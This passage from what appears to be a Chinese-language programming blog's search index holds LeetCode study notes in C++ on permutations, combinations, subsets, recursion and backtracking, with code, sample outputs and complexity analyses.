vec.push_back(nums[cur]), vec.push_back(graph[cur]);</span></span><br><span class="line">    <span class="built_in">backtrack</span>(res,cur+<span class="number">1</span>, ..., vec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>這段程式碼的時間複雜度主要由遞歸生成組合的過程決定。</p><p>組合數量：從 <code>n</code> 個元素中選擇 <code>k</code> 個的組合數量為 $C(n,k) &#x3D; \frac{n!}{k!(n-k)!} \times k $ 。這表示最壞情況下生成組合的總數量。</p><p>每個組合的生成過程：對於每個組合，向量 result_Subarray 的填充和 pop_back 操作是 $O(k)$，因為每次遞迴會處理一個大小為 k 的子集合。</p><p>因此，總的時間複雜度為： $O(C(n,k) \times k) &#x3D; O ( \binom{n}{k} \times k ) &#x3D; O( \frac{n!}{k!(n-k)!} \times k )$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>Recursive Call Stack: 由於要選出 <code>k</code> 個元素，因此為 $O(k)$</li><li>組合結果儲存空間，組合存放在 <code>result</code> 中，並且每個組合大小維 <code>k</code>，並且一共有  $C(n,k)$ 個組合</li></ul><p>因此整體空間複雜度會是:  $O(C(n,k) \times k) &#x3D; O ( \binom{n}{k} \times k ) &#x3D; O( \frac{n!}{k!(n-k)!} \times k )$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
            <tag> combinations </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排列問題 | Medium | LeetCode#46. Permutations</title>
      <link href="/posts/713e66af.html"/>
      <url>/posts/713e66af.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/46/question.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定一個整數陣列 <code>nums</code> 其中不包含重複數字，找到所有數字排列後的可能情況。</li></ul><div class="note info flat"><p>輸入: <code>nums = [1,2,3]</code><br>輸出: <code>[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</code><br>輸出結果為輸入陣列中元素的各種排列結果。</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>Permutations 其實就是經典的 backtracking 題目，也是典型的樹狀結構，在每一層都先選擇一個數字，並且透過遞迴進入下一層，而一但到達指定層數，就可想辦法 return，退回後原先占用在陣列的數字就可以 pop 出來的。但我按照這個想法時做的時候，起初的結果是有重複數字的，也就是 <code>[1,1,1]</code>,<code>[1,1,2]</code> … <code>[3,3,3]</code> 像是這種的，後來才進行了修正。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; numList;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; final_result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">permutehelper</span><span class="params">(<span class="type">int</span> depth, vector&lt;<span class="type">int</span>&gt; &amp;temp_result, <span class="type">int</span> MAX_DEPTH)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == MAX_DEPTH)&#123;</span><br><span class="line">            final_result.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numList.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            temp_result.<span class="built_in">push_back</span>(numList[i]);</span><br><span class="line">            <span class="type">int</span> restore = numList[i];</span><br><span class="line">            numList.<span class="built_in">erase</span>(numList.<span class="built_in">begin</span>()+i);</span><br><span class="line">            <span class="built_in">permutehelper</span>(depth+<span class="number">1</span>, temp_result, MAX_DEPTH);</span><br><span class="line">            temp_result.<span class="built_in">pop_back</span>();</span><br><span class="line">            numList.<span class="built_in">insert</span>(numList.<span class="built_in">begin</span>()+i, restore);</span><br><span class="line">            restore =<span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums)&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; subResult;</span><br><span class="line">        numList = nums;</span><br><span class="line">        <span class="type">int</span> max_depth = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">permutehelper</span>(<span class="number">0</span>, subResult, max_depth);</span><br><span class="line">        <span class="keyword">return</span> final_result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而修正的方式也就是透過 <code>vector</code> STL 當中的 <code>erase</code> 以及 <code>insert</code>，在迴圈當中，先將數字 push 進要回傳的二維陣列中的第二層陣列。接著透過一個變數 <code>restore</code> 保存push進的值，接著在下一層遞迴之前，<strong>先將題目給的陣列中將我們選擇的數字 (<code>numList[i]</code>)去掉，否則就會發生重複</strong>，一旦到達指定層數後，就代表不會在能夠有新的數字加進第二層陣列中，這也代表這一輪的排列完畢，即可加入最終要回傳的二維陣列中。</p><p>一旦有陣列從下一層回退到上一層，這時就要將第二層陣列中原先插入的值 pop 出來，以便挪出空位給之後其他種可能的數字放入，並且還要將剛剛從題目陣列中移除的值，加入回來，剛剛所使用的變數 <code>restore</code> 也就要用在這時候。</p><p>最後回傳二維陣列。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/46/result.png"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; numList;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; final_result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">permutehelper</span><span class="params">(<span class="type">int</span> depth, vector&lt;<span class="type">int</span>&gt; &amp;temp_result, <span class="type">int</span> MAX_DEPTH, vector&lt;<span class="type">bool</span>&gt;&amp; used)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == MAX_DEPTH)&#123;</span><br><span class="line">            final_result.<span class="built_in">push_back</span>(temp_result);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numList.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!used[i])&#123;</span><br><span class="line">                temp_result.<span class="built_in">push_back</span>(numList[i]);</span><br><span class="line">                used[i] = <span class="literal">true</span>;</span><br><span class="line">                <span class="built_in">permutehelper</span>(depth+<span class="number">1</span>, temp_result, MAX_DEPTH, used );</span><br><span class="line">                temp_result.<span class="built_in">pop_back</span>();</span><br><span class="line">                used[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums)&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; subResult;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">isused</span><span class="params">(nums.size(), <span class="literal">false</span>)</span></span>;</span><br><span class="line">        numList = nums;</span><br><span class="line">        <span class="type">int</span> max_depth = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">permutehelper</span>(<span class="number">0</span>, subResult, max_depth, isused);</span><br><span class="line">        <span class="keyword">return</span> final_result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>透過在函數中添加一個 <code>vector&lt;bool&gt; &amp;used</code> 來去控制在每個迴圈中該值是否有使用過，就不用持續對陣列進行移除跟插入的動作了。</p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>排列的數量： 全排列的總數是 $n!$，其中 <code>n</code> 是 <code>nums</code> 的長度。</li><li>遞迴操作： 在每次遞迴調用中，程式會檢查哪些數字尚未被使用（即 <code>!used[i]</code>），這個操作的時間是 $O(n)$。在每個遞迴層，會依次處理所有剩下的數字，這是一個 $O(n)$ 的操作。</li></ul><p>總體來說，程式會進行 n! 次排列生成，而每次生成的時間是 O(n)，因此時間複雜度為：$O(n \times n!)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>遞迴深度： $O(n)$</li><li>結果保存在 <code>final_result</code> 中，總共有 $n!$ 個排列，每個排列的長度是 <code>n</code>。因此結果的空間複雜度是 $O(n \times n!)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
            <tag> permutation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題知識整理 |  Backtracking &amp; Recursive</title>
      <link href="/posts/48f553b3.html"/>
      <url>/posts/48f553b3.html</url>
      
        <content type="html"><![CDATA[<h1 id="遞迴"><a href="#遞迴" class="headerlink" title="遞迴"></a>遞迴</h1><p>在解 backtracking 題目的時候，通常可以使用遞迴回來實現，那最好還是要先了解遞迴的想法。遞迴的核心想法就是 <strong>「大問題拆成多個小問題，小問題也能按照相同方式切成更小的問題」</strong>、<strong>「除了最小的問題之外，每層的解決方式都一樣」</strong></p><p><img src="/img/LeetCode/backtracking/recursion.png"></p><h2 id="河內塔問題-Tower-of-Hanoi"><a href="#河內塔問題-Tower-of-Hanoi" class="headerlink" title="河內塔問題(Tower of Hanoi)"></a>河內塔問題(Tower of Hanoi)</h2><p><img src="/img/LeetCode/backtracking/tower1.png"></p><p>河內塔問題就是經典的遞迴問題，它的問題是，<strong>有三根柱子，並有 N 個圓盤套在最左邊柱子上面（上圖 N &#x3D; 4)，現在我們要把它們全部移動到最右邊的柱子上，請問我們最少需要移動幾次？</strong></p><div class="note info flat"><ol><li>每次可選一個柱子，移動最上方的圓盤，一次只能一動一個</li><li>大的圓盤不可以疊在小的上面</li></ol></div><p>這裡就需要 Follow 一下遞迴的思維，<strong>靠解決多個小問題來解決大問題</strong>。 這裡的大問題就是 <strong>要怎麼移動四個圓盤到最右邊要幾個步驟?</strong> 而小問題則是 <strong>移動三個圓盤要幾步?</strong></p><blockquote><p>這邊問題本質一樣，只是問題範圍縮小而已，這裡假設我們已經知道移動兩個圓盤的答案，可以將問題想像成下面圖這樣</p></blockquote><p><img src="/img/LeetCode/backtracking/tower2.png"></p><ol><li>從左邊將上面三個圓盤移動到中間 (怎麼移動的先不管，總之目前結果就是有三個圓盤疊在中間)</li><li>將最左邊的圓盤移動到最右邊</li><li>將中間三個圓盤移動到最右邊  (怎麼移動的先不管，總之目前結果就是三個圓盤疊到最右邊圓盤)</li></ol><p>因為題目在意的是 <strong>移動的步驟數</strong>，先假設移動左邊三個盤子到中間需要 $K$ 個步驟數，而將剩餘一個盤子移動到最右邊需要 1 個步驟數，最後將中間三個盤子移動到最右邊會需要 $K$ 個步驟數，因此整體步驟數會是 $2*K +1$。</p><p>從大小問題的關係中可以得到關係式會是 : $ F(N) &#x3D; 2*F(N-1)+1$，其中 $F(N)$ 為移動 $N$ 個盤子的步驟數。當然實作的時候還需要考慮最小的問題，這裡最小的問題就是一個圓盤移動的步驟數，那當然就是 1 。因此我們可以將演算法寫成像是下面這樣:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">HanoiTower</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>* <span class="built_in">HaniTower</span>(n<span class="number">-1</span>) +<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>總結，在碰到遞迴時候總是要想這三點 (1) 大小問題分別是甚麼 (2) 大小問題的關聯式怎麼寫 (3)最小問題會是甚麼?</p></blockquote><h1 id="回溯法-Backtracking-介紹"><a href="#回溯法-Backtracking-介紹" class="headerlink" title="回溯法(Backtracking) 介紹"></a>回溯法(Backtracking) 介紹</h1><blockquote><p>　Backtracking 算是一種窮舉演算法，它的核心思想在於 <strong>「路走不通就回頭」</strong>，也就是當你想要搜尋一個資料的時候，某一個資料路徑走不通，就退回上一步，然後走其他路。所以一定會有一個條件用來判斷是不是要走的路，不符合條件就退回。</p></blockquote><p><strong>Backtracking 可以通常透過遞迴來實現</strong></p><h1 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h1><h2 id="Enumerate"><a href="#Enumerate" class="headerlink" title="Enumerate"></a>Enumerate</h2><ul><li>列出每一個可進行的下一步</li></ul><h2 id="Pruning"><a href="#Pruning" class="headerlink" title="Pruning"></a>Pruning</h2><ul><li>遇到不符合條件的，就省略下一步，不繼續枚舉</li><li>這其實比較進階，其實就是要能夠讓搜尋提早結束</li></ul><blockquote><p>老實說之前在解 Tree 相關概念的時候都已經有用到 backtracking 的概念，像是 DFS，在一開始就會設定終止條件 (Ex.走到leaf) 然後每次都會去遞迴呼叫下個dfs函數，來去走訪下一個節點。</p></blockquote><h1 id="Backtracking-問題分類"><a href="#Backtracking-問題分類" class="headerlink" title="Backtracking 問題分類"></a>Backtracking 問題分類</h1><h2 id="Permutations"><a href="#Permutations" class="headerlink" title="Permutations"></a>Permutations</h2><p>找了網路上很多講解 backtracking 概念都是用 Permutations 來當範例解釋。問題大致上就是 <strong>猜密碼</strong>，例如 1,2,3 猜有幾種不重複的密碼組合，或是用符號來排序看有多少組合數。 <strong>普遍的想法就是會以遞迴去解，去窮盡所有可能，而不對的答案就退回。</strong></p><p><img src="/img/LeetCode/backtracking/backt.png"></p><p>這裡也可先分成不同層來看待，上途中每次遞迴呼叫都會往下走一層，而一開始由於根本沒有號碼，因此沒有值，可以想成第0層，而往下一層就代表要開始探究可能的數字了，首先密碼的第一碼可能是 <code>1</code>, <code>2</code> 或 <code>3</code>。之後一樣遞迴呼叫下一層，對於第一碼為 <code>1</code> 的狀況來說，第二碼也可能是 <code>1</code>, <code>2</code> 或 <code>3</code>，新增的號碼append在舊號碼後面，因此目前會有 <code>1,1</code>, <code>1,2</code>, <code>1,3</code>，而第二碼為 <code>2</code> 的狀況下，它的下一層會是 <code>2,1</code>, <code>2,2</code>, <code>2,3</code>，而 <code>3</code> 的下一層也可能是 <code>3,1</code>, <code>3,2</code>, <code>3,3</code>。接著再遞迴呼叫下一層。而遞迴呼叫的終止條件就是當我們到達所需層數後，找到密碼。</p><p>下面是簡易的實作方式:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">permutate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; password, vector&lt;<span class="type">bool</span>&gt;&amp; used)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password.<span class="built_in">size</span>() == nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; password.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cout &lt;&lt; password[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!used[i]) &#123;</span><br><span class="line">            used[i] = <span class="literal">true</span>;</span><br><span class="line">            password.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">permutate</span>(nums, password, used); </span><br><span class="line">            password.<span class="built_in">pop_back</span>();</span><br><span class="line">            used[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; </span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; passList;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">used</span><span class="params">(nums.size(), <span class="literal">false</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">permutate</span>(nums, passList, used);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的這段就是終止條件，一旦為最大深度就停止繼續查找</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(depth == MAX_DEPTH)&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; password.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        cout &lt;&lt; password[i] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     cout &lt;&lt; endl;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>下面則是在每個節點都嘗試插入<code>1</code>, <code>2</code> 或 <code>3</code> 後再去往下一層前進，而如果到達最大深度就退回，退回一層後就把原先占用在 <code>password</code> 最後一位的數字清空</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!used[i]) &#123;</span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        password.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">        <span class="built_in">permutate</span>(nums, password, used); </span><br><span class="line">        password.<span class="built_in">pop_back</span>();</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>輸出結果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 </span><br><span class="line">1 3 2 </span><br><span class="line">2 1 3 </span><br><span class="line">2 3 1 </span><br><span class="line">3 1 2 </span><br><span class="line">3 2 1 </span><br></pre></td></tr></table></figure><h2 id="Subsets"><a href="#Subsets" class="headerlink" title="Subsets"></a>Subsets</h2><blockquote><p>這類題目通常會給定一個不含重複數字的整數集合，要你找出所有可能的子集</p></blockquote><div class="note info flat"><p>對於整數集合: <code>[1,2,3]</code> 來說，所有可能子集合為:<br>{ <code>[]</code>,<code>[1]</code>,<code>[2]</code>,<code>[3]</code>,<code>[1,2]</code>,<code>[1,3]</code>,<code>[2,3]</code>,<code>[1,2,3]</code>}</p><ul><li><code>[1,2]</code> &#x3D; <code>[2,1]</code></li><li><code>[1]</code> &#x3D; <code>[1,1]</code></li></ul></div><p>這種類型題目可用 Backtracking 來解，<strong>並且在每一步都可以選擇是否包含某個元素</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; result; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">subsets</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;sets, <span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index == sets.<span class="built_in">size</span>()) &#123; </span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#123; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; result.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cout &lt;&lt; result[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 不加入當前元素</span></span><br><span class="line">    <span class="built_in">subsets</span>(sets, index + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加入當前元素</span></span><br><span class="line">    result.<span class="built_in">push_back</span>(sets[index]);</span><br><span class="line">    <span class="built_in">subsets</span>(sets, index + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 退回上一個選擇</span></span><br><span class="line">    result.<span class="built_in">pop_back</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">subsets</span>(nums, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>輸出結果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#125;</span><br><span class="line">&#123; 3 &#125;</span><br><span class="line">&#123; 2 &#125;</span><br><span class="line">&#123; 2 3 &#125;</span><br><span class="line">&#123; 1 &#125;</span><br><span class="line">&#123; 1 3 &#125;</span><br><span class="line">&#123; 1 2 &#125;</span><br><span class="line">&#123; 1 2 3 &#125;</span><br></pre></td></tr></table></figure><p>它的呼叫邏輯也會是一個經典的樹狀結構</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                             subsets(nums, 0)</span><br><span class="line">                          /                      \</span><br><span class="line">               subsets(nums, 1)               subsets(nums, 1)</span><br><span class="line">               (不加入 1)                         (加入 1)</span><br><span class="line">             /             \                   /           \</span><br><span class="line">  subsets(nums, 2)  subsets(nums, 2)   subsets(nums, 2)   subsets(nums, 2)</span><br><span class="line">   (不加入 2)        (加入 2)           (不加入 2)          (加入 2)</span><br><span class="line">   /       \          /      \           /      \            /     \</span><br><span class="line">subsets   subsets  subsets  subsets   subsets  subsets  subsets  subsets</span><br><span class="line">(nums, 3) (nums, 3) (nums, 3) (nums, 3) (nums, 3) (nums, 3) (nums, 3) (nums, 3)</span><br><span class="line"> (不加入 3)   (加入 3)   (不加入 3)   (加入 3)   (不加入 3)  (加入 3)  (不加入 3)  (加入 3)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>當我們到達葉子節點（<code>index == nums.size()</code>），此時我們已經做出了所有決策，並且形成了一個完整的子集，該子集就會被輸出</p><h2 id="Combinations"><a href="#Combinations" class="headerlink" title="Combinations"></a>Combinations</h2><blockquote><p>這種就類似高中的排列組合，給整數 1 到 N，選擇 K 個數字，求所有可能的組合。</p></blockquote><div class="note info flat"><p><code>N=4</code>, <code>K=2</code><br>則輸出結果為:<br><code>{[1,2],[2,3],[3,4],[1,3],[1,4],[2,4]}</code></p></div><p><strong>這種問題解法跟 subsets 類似，就是需要給定起始index，當選出了 K 個數字後就停止。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 